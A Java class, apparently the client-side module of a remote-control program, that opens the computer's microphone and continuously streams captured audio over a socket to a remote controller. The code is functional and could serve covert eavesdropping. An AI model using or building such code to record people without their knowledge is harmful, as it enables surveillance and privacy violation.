package me.client.send;

import me.client.utils.MessageFlags;
import me.client.utils.SendMessage;

import javax.sound.sampled.*;
import java.net.Socket;

public class Audio extends Thread{
    AudioInputStream audioInputStream;
    TargetDataLine mic;
    Socket socket;
    public volatile boolean run = false;
    public Audio(Socket socket){
        this.socket = socket;
    }
    public boolean open(){
        try {
            AudioFormat audioFormat = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);
            DataLine.Info info = new DataLine.Info(TargetDataLine.class, audioFormat);
            mic = (TargetDataLine) AudioSystem.getLine(info);
            mic.open();
            SendMessage.sendHead(MessageFlags.AUDIO_WINDOWS_SHOW,socket);
        }catch (Exception e) {
            return false;
        }
        return true;
    }
    public void close(){
        run = false;
        mic.stop();
        mic.close();
    }
    @Override
    public void run() {
        try {
            mic.start();
            audioInputStream = new AudioInputStream(mic);
            byte[] bytes = new byte[1024*60];
            while (run) {
                Thread.sleep(300);
                audioInputStream.read(bytes);
                SendMessage.send(MessageFlags.AUDIO_DATA,bytes,socket);
            }
        }catch (Exception e) {
        }
    }
}